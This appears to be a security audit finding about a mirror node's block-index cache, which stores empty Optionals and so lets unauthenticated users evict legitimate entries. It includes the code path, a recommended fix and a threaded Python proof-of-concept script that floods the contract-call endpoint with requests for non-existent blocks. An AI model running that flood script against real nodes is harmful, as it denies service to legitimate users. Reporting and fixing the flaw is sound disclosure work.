### Title
Cache Poisoning via Empty Optional Caching in `recordFileIndex` Cache Allows Unprivileged DoS

### Summary
The `findByIndex` method in `RecordFileRepository` uses `@Cacheable` with `unless = "#result == null"`, but the method returns `Optional<RecordFile>`. When a non-existent block is queried, Spring Data JPA returns `Optional.empty()` — which is **not null** — so the guard condition fails and the empty Optional is cached. An unprivileged attacker can flood the `recordFileIndex` Caffeine cache (capacity: 10,000 entries, 10-minute TTL) with empty Optionals for non-existent block numbers, evicting legitimate entries and forcing all subsequent valid historical queries to bypass the cache and hit the database.

### Finding Description

**Exact code path:**

`RecordFileRepository.java` line 27–29:
```java
@Cacheable(cacheNames = CACHE_NAME, cacheManager = CACHE_MANAGER_RECORD_FILE_INDEX, unless = "#result == null")
@Query("select r from RecordFile r where r.index = ?1")
Optional<RecordFile> findByIndex(long index);
``` [1](#0-0) 

`EvmConfiguration.java` lines 153–164 — the backing cache:
```java
@Bean(CACHE_MANAGER_RECORD_FILE_INDEX)
@Primary
CacheManager cacheManagerRecordFileIndex() {
    final var caffeine = Caffeine.newBuilder()
            .expireAfterWrite(10, TimeUnit.MINUTES)
            .maximumSize(10000)
            .recordStats();
    ...
}
``` [2](#0-1) 

**Root cause and failed assumption:**

The `unless = "#result == null"` SpEL expression is evaluated against the return value of `findByIndex`. When no record file exists for the queried block number, Spring Data JPA returns `Optional.empty()` — a non-null object. The condition `#result == null` evaluates to `false`, so Spring proceeds to store `Optional.empty()` in the cache. The developer's intent was to avoid caching "not found" results, but the guard only excludes a literal `null` return, not an empty `Optional`. [1](#0-0) 

**Exploit flow:**

1. Attacker sends POST requests to `/api/v1/contracts/call` with the `block` field set to a valid but non-existent block number (e.g., `9999999999`). [3](#0-2) 

2. `BlockType.of()` accepts any non-negative long, so no format rejection occurs. [4](#0-3) 

3. The request reaches `RecordFileServiceImpl.findByBlockType()` → `recordFileRepository.findByIndex(block.number())`. [5](#0-4) 

4. Cache miss → DB query → returns `Optional.empty()` → `unless = "#result == null"` is `false` → `Optional.empty()` is stored in the cache under the attacker-controlled block number key.

5. Attacker repeats with 10,000 distinct non-existent block numbers. The Caffeine cache reaches `maximumSize=10000` and begins evicting legitimate entries (LRU policy).

6. Legitimate users querying real historical block numbers now miss the cache and hit the database for every request, for up to 10 minutes (TTL).

**Why existing checks are insufficient:**

- `unless = "#result == null"` does not exclude `Optional.empty()`.
- The `ThrottleManager` is gas-based, not per-IP rate limiting, and does not prevent high-volume requests with minimal gas. [6](#0-5) 
- No pre-validation checks whether the block number is within the known range (earliest–latest) before the cache lookup occurs.
- `BlockNumberNotFoundException` is thrown by the caller *after* the empty Optional is already stored in the cache.

### Impact Explanation

All historical `eth_call` and `eth_estimateGas` requests that rely on `findByIndex` to resolve a block number to a `RecordFile` will miss the cache and hit the database directly. Under sustained attack, this can saturate the database connection pool, increase query latency for all users, and degrade or deny service for legitimate historical queries. The `recordFileIndex` cache is also used by `MirrorBlockHashOperation.getBlockHash(long)` via `recordFileRepository.findByIndex`, so BLOCKHASH opcode resolution in EVM execution is also affected. [7](#0-6) 

### Likelihood Explanation

The attack requires no authentication, no special privileges, and no on-chain interaction. Any external user with HTTP access to the `/api/v1/contracts/call` endpoint can execute it. Sending 10,000 requests with distinct block numbers is trivially automatable with a simple script. The 10-minute TTL means the attacker must sustain ~1,000 requests/minute to keep the cache poisoned, which is well within reach of a single machine. The attack is repeatable and persistent.

### Recommendation

Change the `unless` condition on `findByIndex` to also exclude empty Optionals:

```java
@Cacheable(
    cacheNames = CACHE_NAME,
    cacheManager = CACHE_MANAGER_RECORD_FILE_INDEX,
    unless = "#result == null || !#result.isPresent()"
)
Optional<RecordFile> findByIndex(long index);
```

Additionally, consider adding a pre-validation guard that rejects block numbers greater than the latest known block (cached via `findLatest`) before invoking `findByIndex`, and implement per-IP rate limiting independent of gas consumption.

### Proof of Concept

```python
import requests, threading

TARGET = "https://<mirror-node-host>/api/v1/contracts/call"
HEADERS = {"Content-Type": "application/json"}

# Step 1: Flood cache with 10,000 unique non-existent block numbers
def poison(start, end):
    for block_num in range(start, end):
        payload = {
            "block": str(9_000_000_000 + block_num),  # non-existent blocks
            "data": "0x",
            "to": "0x0000000000000000000000000000000000000001",
            "gas": 50000
        }
        requests.post(TARGET, json=payload, headers=HEADERS)

threads = [threading.Thread(target=poison, args=(i*1000, (i+1)*1000)) for i in range(10)]
for t in threads: t.start()
for t in threads: t.join()

# Step 2: Verify legitimate historical queries now miss cache (observe DB query latency spike)
import time
REAL_BLOCK = "1000"  # a real block number
t0 = time.time()
for _ in range(10):
    requests.post(TARGET, json={"block": REAL_BLOCK, "data": "0x",
                                "to": "0x0000000000000000000000000000000000000001",
                                "gas": 50000}, headers=HEADERS)
print(f"Avg latency after poisoning: {(time.time()-t0)/10:.3f}s")
# Expected: significantly higher latency vs baseline due to cache eviction and DB fallback
```

### Citations

**File:** web3/src/main/java/org/hiero/mirror/web3/repository/RecordFileRepository.java (L27-29)
```java
    @Cacheable(cacheNames = CACHE_NAME, cacheManager = CACHE_MANAGER_RECORD_FILE_INDEX, unless = "#result == null")
    @Query("select r from RecordFile r where r.index = ?1")
    Optional<RecordFile> findByIndex(long index);
```

**File:** web3/src/main/java/org/hiero/mirror/web3/evm/config/EvmConfiguration.java (L153-164)
```java
    @Bean(CACHE_MANAGER_RECORD_FILE_INDEX)
    @Primary
    CacheManager cacheManagerRecordFileIndex() {
        final var caffeine = Caffeine.newBuilder()
                .expireAfterWrite(10, TimeUnit.MINUTES)
                .maximumSize(10000)
                .recordStats();
        final CaffeineCacheManager caffeineCacheManager = new CaffeineCacheManager();
        caffeineCacheManager.setCacheNames(Set.of(CACHE_NAME));
        caffeineCacheManager.setCaffeine(caffeine);
        return caffeineCacheManager;
    }
```

**File:** web3/src/main/java/org/hiero/mirror/web3/controller/ContractController.java (L37-51)
```java
    @PostMapping(value = "/call")
    ContractCallResponse call(@RequestBody @Valid ContractCallRequest request, HttpServletResponse response) {
        try {
            throttleManager.throttle(request);
            validateContractMaxGasLimit(request);

            final var params = constructServiceParameters(request);
            final var result = contractExecutionService.processCall(params);
            return new ContractCallResponse(result);
        } catch (InvalidParametersException e) {
            // The validation failed, but no processing occurred so restore the consumed tokens.
            throttleManager.restore(request.getGas());
            throw e;
        }
    }
```

**File:** web3/src/main/java/org/hiero/mirror/web3/viewmodel/BlockType.java (L37-55)
```java
    private static BlockType extractNumericBlock(String value) {
        int radix = 10;
        var cleanedValue = value;

        if (value.startsWith(HEX_PREFIX)) {
            radix = 16;
            cleanedValue = Strings.CS.removeStart(value, HEX_PREFIX);
        }

        if (cleanedValue.contains(NEGATIVE_NUMBER_PREFIX)) {
            throw new IllegalArgumentException("Invalid block value: " + value);
        }

        try {
            long blockNumber = Long.parseLong(cleanedValue, radix);
            return new BlockType(value, blockNumber);
        } catch (Exception e) {
            throw new IllegalArgumentException("Invalid block value: " + value, e);
        }
```

**File:** web3/src/main/java/org/hiero/mirror/web3/service/RecordFileServiceImpl.java (L19-27)
```java
    public Optional<RecordFile> findByBlockType(BlockType block) {
        if (block == BlockType.EARLIEST) {
            return recordFileRepository.findEarliest();
        } else if (block == BlockType.LATEST) {
            return recordFileRepository.findLatest();
        }

        return recordFileRepository.findByIndex(block.number());
    }
```

**File:** web3/src/main/java/org/hiero/mirror/web3/throttle/ThrottleManager.java (L1-14)
```java
// SPDX-License-Identifier: Apache-2.0

package org.hiero.mirror.web3.throttle;

import org.hiero.mirror.web3.viewmodel.ContractCallRequest;

public interface ThrottleManager {

    void throttle(ContractCallRequest request);

    void throttleOpcodeRequest();

    void restore(long gas);
}
```

**File:** web3/src/main/java/org/hiero/mirror/web3/evm/contracts/operations/MirrorBlockHashOperation.java (L73-76)
```java
    private Hash getBlockHash(long blockNumber) {
        final var recordFile = recordFileRepository.findByIndex(blockNumber);
        return recordFile.map(this::getBlockHash).orElse(Hash.ZERO);
    }
```
